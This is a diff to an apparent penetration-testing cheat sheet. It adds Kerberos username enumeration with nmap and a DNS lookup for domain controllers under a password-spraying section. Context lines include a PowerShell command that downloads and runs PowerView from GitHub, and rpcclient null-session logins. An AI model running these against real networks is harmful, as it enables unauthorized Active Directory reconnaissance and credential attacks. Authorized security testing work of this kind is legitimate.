@@ -80,6 +80,12 @@ Machine 10.0.2.7 asks for an unknown host, then the attacker machine 10.0.2.15 r
 
 ## Internal Password Spraying
 
+### Get domain users using Kerberos
+```
+dig _ldap._tcp.dc._msdcs.Domain_Name // Find Domain Controller
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt 10.196.1.13
+```
+
 ### Get domain users using powerview
 ```
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1");
@@ -88,7 +94,7 @@ Get-DomainUser | select samaccountname > users.txt
 
 ### Get domain users using rpcclient
 ```
-nmap -Pn -sS -p389 --open 10.10.0.0/16 // Find Domain Controller
+nmap -Pn -sS -p389,88 --open 10.10.0.0/16 // Find Domain Controller
 
 rpcclient -U "" -N 10.10.1.50 // Authenticate Using Null Session
 rpcclient -U "MEGA\hsaad" 10.10.1.50 // Authenticate Using Domain User & Password
